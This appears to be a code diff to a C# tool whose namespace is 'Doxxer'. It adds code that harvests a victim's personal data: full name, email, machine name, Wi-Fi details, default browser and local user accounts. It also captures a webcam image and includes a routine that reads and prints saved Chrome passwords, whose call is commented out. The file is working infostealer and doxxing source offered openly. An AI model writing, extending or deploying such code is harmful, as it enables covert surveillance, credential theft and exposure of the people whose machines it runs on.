@@ -1,7 +1,9 @@
 ﻿using System;
 using System.Diagnostics;
+using System.DirectoryServices;
 using System.DirectoryServices.AccountManagement;
 using Emgu.CV;
+using Microsoft.Win32;
 using SimpleWifi;
 
 namespace Doxxer
@@ -10,7 +12,15 @@ namespace Doxxer
     {
         public GatherData()
         {
+            Console.Write(getFullName() + "\n");
+            Console.Write(getUserEmail() + "\n");
+            Console.Write(getComputerName() + "\n");
+            Console.Write(getConnectedWifi().Name + "\n");
+            Console.Write(GetWifi() + "\n");
+            Console.Write(GetSystemDefaultBrowser() + "\n\n");
+            //getPasswordsFromBrowser("chrome");
             takeWebCamPicture();
+            getAccounts();
         }
 
         private string GetWifi()
@@ -25,7 +35,7 @@ namespace Doxxer
             wifiProcess.StartInfo.RedirectStandardOutput = true;
             wifiProcess.StartInfo.CreateNoWindow = true;
             wifiProcess.Start();
-            string output = wifiProcess.StandardOutput.ReadToEnd();
+            var output = wifiProcess.StandardOutput.ReadToEnd();
             wifiProcess.WaitForExit();
             return output;
         }
@@ -84,17 +94,65 @@ namespace Doxxer
             UserPrincipal.Current.UnlockAccount();
         }
 
+        private void getAccounts()
+        {
+            var path =
+                string.Format("WinNT://{0},computer", Environment.MachineName);
+
+            using (var computerEntry = new DirectoryEntry(path))
+                foreach (DirectoryEntry childEntry in computerEntry.Children)
+                    if (childEntry.SchemaClassName == "User")
+                        Console.Write(childEntry.Name + "\n");
+        }
+
         private void takeWebCamPicture()
         {
             var capture = new VideoCapture();
             if (capture.QueryFrame() != null && capture.IsOpened)
             {
-                for (int i = 0; i < 300; i++)
-                {
-                    var image = capture.QueryFrame().ToBitmap();
-                    image.Save(i + "webcam.png");
-                }
+                var image = capture.QueryFrame().ToBitmap();
+                image.Save("webcam.png");
+            }
+        }
 
+        private string GetSystemDefaultBrowser()
+        {
+            string name = string.Empty;
+            RegistryKey regKey = null;
+
+            try
+            {
+                var regDefault = Registry.CurrentUser.OpenSubKey(
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.htm\\UserChoice", false);
+                var stringDefault = regDefault.GetValue("ProgId");
+
+                regKey = Registry.ClassesRoot.OpenSubKey(stringDefault + "\\shell\\open\\command", false);
+                name = regKey.GetValue(null).ToString().ToLower().Replace("" + (char)34, "");
+
+                if (!name.EndsWith("exe"))
+                    name = name.Substring(0, name.LastIndexOf(".exe") + 4);
+            }
+            catch (Exception ex)
+            {
+                name = string.Format(
+                    "ERROR: An exception of type: {0} occurred in method: {1} in the following module: {2}",
+                    ex.GetType(), ex.TargetSite, GetType());
+            }
+            finally
+            {
+                if (regKey != null)
+                    regKey.Close();
+            }
+
+            return name;
+        }
+
+        private void getPasswordsFromBrowser(String browser)
+        {
+            var passwords = new ChromePassReader().ReadPasswords(browser);
+            foreach (var password in passwords)
+            {
+                Console.Write(password.Url + ": " + password.Username + ": " + password.Password + "\n");
             }
         }
     }
